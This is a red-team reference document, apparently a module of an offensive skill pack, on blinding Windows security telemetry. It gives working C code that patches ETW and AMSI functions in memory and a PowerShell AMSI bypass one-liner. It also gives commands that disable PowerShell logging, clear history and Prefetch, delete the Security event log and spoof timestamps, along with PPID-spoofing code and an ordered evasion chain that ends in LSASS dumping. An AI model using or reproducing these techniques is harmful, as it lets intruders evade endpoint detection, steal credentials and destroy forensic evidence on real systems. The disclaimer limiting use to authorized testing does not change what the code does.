# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> Authorized red team / adversary simulation / own-product testing only; use against unauthorized targets is forbidden.

EDR detection capability largely depends on two telemetry pipelines: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document aggregates red team countermeasures for both pipelines, plus anti-forensics combinations such as Sysmon / PowerShell logging / timestamp spoofing.

Maps to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW Internal Structure

ETW is Windows' built-in high-performance event tracing framework; EDRs use it as "lightweight kernel telemetry".
Providers red teams care about most:

| Provider GUID | Name | Who uses it |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDRs |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | basic process / thread events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key User-Mode APIs

| API | DLL | Purpose |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | write events (most common) |
| `EtwEventWriteFull` | `ntdll.dll` | events with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | extended version |
| `NtTraceEvent` | `ntdll.dll` | underlying EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | control trace sessions (start/stop/query providers) |
| `EtwEventEnabled` | `ntdll.dll` | whether a provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | register a provider |

### Call Chain

```text
application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → consumers (EDR user-mode processes subscribed to the session)
```

## 2. Three ETW Patch Methods

### Method A: EtwEventWrite Head Patch

Change the `ntdll!EtwEventWrite` entry to return success immediately:

```text
original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

after patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // note: VirtualProtect itself may be hooked -> use the indirect syscall variant
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: writing ntdll memory is itself the source of the `ALPC_MODIFY_PROCESS` / `PROTECTVM` events that ETW-TI monitors.
You MUST **patch only after using indirect syscalls and bypassing the NtProtectVirtualMemory hook**;
otherwise the EDR already gets the alert before the patch takes effect.

### Method B: EtwEventEnabled always-false

More covert: instead of modifying `EtwEventWrite`, make `EtwEventEnabled` always return FALSE;
the application layer then concludes "provider not enabled" → it won't call `EtwEventWrite`. This is friendlier to memory hash integrity checks (many EDRs verify `EtwEventWrite` bytes).

```c
// EtwEventEnabled usually returns a BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl to disable the provider

Use a syscall to directly stop the EDR session (intrusive, but doesn't touch ntdll bytes):

```c
// NtTraceControl(EtwpStopTrace, ...)
// requires SeSystemProfilePrivilege or higher
// applies after Local Admin + UAC bypass
```

Rarely used in practice because:

- Stopping a session itself fires an "ETW provider stopped" event that another pipeline can sense
- Requires high privileges

### Method D: Kernel-mode ETW patch (only when you already have BYOVD/kernel read-write)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
set to 0 directly to have all ETW-TI events dropped
```

This belongs to the BYOVD stage of attack-chain; this skill doesn't go deeper.

## 3. AMSI Bypass

AMSI is the interface Windows provides to PowerShell / .NET / WMI / VBA for antivirus scanning before executing scripts.
Red teams most often face PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// write at amsi.dll!AmsiScanBuffer entry:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

One-liner PowerShell version (detection-countermeasure reference only; it's signature-flagged / blocked by Defender):

```powershell
# concept demo — real environments must combine obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced Option 1: Hardware Breakpoint AMSI Bypass

Doesn't touch amsi.dll memory (won't trigger integrity scans):

1. AddVectoredExceptionHandler
2. Set `DR0` at the `AmsiScanBuffer` entry
3. On VEH hit, set `RAX = 0x80070057`, `RIP = address of the ret instruction`, `RSP += 8`
4. ContinueExecution

Uses the same infrastructure as the HWBP Blindside in unhook-techniques.md; the VEH can be shared.

### Advanced Option 2: Corrupt AmsiContext / AmsiSession

Construct a malformed `AmsiContext` structure so `AmsiScanBuffer` internally fails validation but returns success early:

```text
// AmsiContext header should be the "AMSI" magic
// change it to "XXXX" → AmsiScanBuffer internal validation fails but returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced Option 3: Reflectively Load a Copy of amsi.dll

Instead of the system amsi.dll, reflectively load a clean copy into your own process and redirect the PowerShell engine's AMSI calls.
Useful against advanced EDRs that already intercept PowerShell.exe at load time.

## 4. Anti-Forensics: Clearing Traces

### Disabling PowerShell ScriptBlock Logging

```powershell
# registry (needs admin)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clearing PowerShell History

```powershell
# current session
Clear-History
# persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clearing Prefetch

```powershell
# needs SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# wipe everything (heavy action, use with caution)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clearing ETL Logs

```powershell
# stop the session then delete the etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# note: directly deleting .evtx causes the Event Log Service to recreate it and write a "log cleared" event (Event ID 1102)
# more covert: patch the EventLog API of wevtsvc.dll in memory (part of T1070.001)
```

### Timestamp Spoofing (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Evading Sysmon Monitoring

Sysmon is the most common free telemetry in the community (many enterprises use the olaf config).
Key events:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (incl. PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion Approaches

1. **Don't create new processes** — operate entirely inside an already-injected process, avoiding Event ID 1
2. **PPID Spoof** — use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set PPID to `explorer.exe`, making Sysmon ProcessCreate look legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + don't touch the image** — Process Hollowing is caught by Event ID 25 in newer Sysmon.
   Prefer newer techniques like **module stomping** (overwriting a section of an already-loaded legitimate DLL) or **dirty vanity**,
   combined with PPID spoofing
4. **No remote threads** — avoid Event ID 8; use `NtCreateThreadEx` inside your own process / APC / Early Bird APC
5. **DNS over DoH / HTTPS** — avoid Event ID 22

## 6. Call Stack Spoof + Timestamps to Look Like Legitimate Software

Even if ProcessCreate can't be avoided (e.g. some scenarios must spawn children), you can:

- Change CommandLine to resemble a legitimate software format
- PPID spoof to services.exe (masquerade as an SCM-started service)
- Modify the Image hash seen by ImageLoad: put implant code into a signed DLL's memory space via module stomping
- Combine with CallStackSpoofer: even with Sysmon EnableCallTracing on, implant frames aren't visible

## 7. Practical OPSEC: Order of Operations

**If the order is wrong, the EDR gets the alert first**, and subsequent actions get circuit-broken.

Correct order:

```text
1. AMSI bypass (prefer HWBP, avoid writing amsi.dll)
   ─── let .NET / PowerShell load the implant without being scanned
2. ETW patch (patch EtwEventWrite first, before any syscalls)
   ─── kill telemetry for your own subsequent actions
3. NtProtectVirtualMemory via indirect syscall
   ─── prepare a "safe" memory-permission switching channel
4. Unhook ntdll (Peruns Fart) or enable indirect syscall
   ─── wipe user-mode hooks
5. Call stack spoof setup
   ─── prepare the fake stack for all subsequent syscalls
6. actual payload execution (injection / lateral / LSASS dump)
7. clear traces (PowerShell history / Prefetch / timestamps)
```

Wrong-order examples:

```text
❌ unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC already has the alert
❌ dump LSASS first → AMSI / ETW not yet suppressed → high-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf config: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing Callback

After completing this trio (hook survey → unhook → telemetry blinding), return to Step 5 of `SKILL.md` to validate in the sandbox,
then move to the next phase via the initial access and lateral movement sections of `attack-chain/`.

